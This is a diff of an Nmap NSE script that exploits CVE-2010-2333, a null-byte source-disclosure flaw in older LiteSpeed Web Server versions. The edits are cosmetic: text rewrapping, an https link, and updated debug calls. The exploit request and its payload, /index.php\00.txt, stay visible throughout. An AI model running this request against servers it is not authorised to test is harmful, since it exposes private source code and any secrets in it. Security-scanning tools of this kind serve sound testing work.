@@ -5,9 +5,13 @@ local stdnse = require "stdnse"
 local string = require "string"
 
 description = [[
-Exploits a null-byte poisoning vulnerability in Litespeed Web Servers 4.0.x before 4.0.15 to retrieve the target script's source code by sending a HTTP request with a null byte followed by a .txt file extension (CVE-2010-2333).
+Exploits a null-byte poisoning vulnerability in Litespeed Web Servers 4.0.x
+before 4.0.15 to retrieve the target script's source code by sending a HTTP
+request with a null byte followed by a .txt file extension (CVE-2010-2333).
 
-If the server is not vulnerable it returns an error 400. If index.php is not found, you may try /phpinfo.php which is also shipped with LiteSpeed Web Server. The attack payload looks like this:
+If the server is not vulnerable it returns an error 400. If index.php is not
+found, you may try /phpinfo.php which is also shipped with LiteSpeed Web
+Server. The attack payload looks like this:
 * <code>/index.php\00.txt</code>
 
 References:
@@ -34,7 +38,7 @@ References:
 ---
 
 author = "Paulino Calderon <calderon@websec.mx>"
-license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
+license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
 categories = {"vuln", "intrusive", "exploit"}
 
 
@@ -44,7 +48,7 @@ action = function(host, port)
   local output = {}
   local rfile = stdnse.get_script_args("http-litespeed-sourcecode-download.uri") or "/index.php"
 
-  stdnse.print_debug(1, "%s: Trying to download the source code of %s", SCRIPT_NAME, rfile)
+  stdnse.debug1("Trying to download the source code of %s", rfile)
   --we append a null byte followed by ".txt" to retrieve the source code
   local req = http.get(host, port, rfile.."\00.txt")
 
@@ -56,7 +60,7 @@ action = function(host, port)
       elseif req.status == 404 and nmap.verbosity() >= 2 then
         output[#output+1] = string.format("Page: %s was not found. Try with an existing file.", rfile)
       end
-      stdnse.print_debug(2, "%s:Request status:%s body:%s", SCRIPT_NAME, req.status, req.body)
+      stdnse.debug2("Request status:%s body:%s", req.status, req.body)
     else
       output[#output+1] = "\nLitespeed Web Server Source Code Disclosure (CVE-2010-2333)"
       output[#output+1] = string.format("%s source code:", rfile)
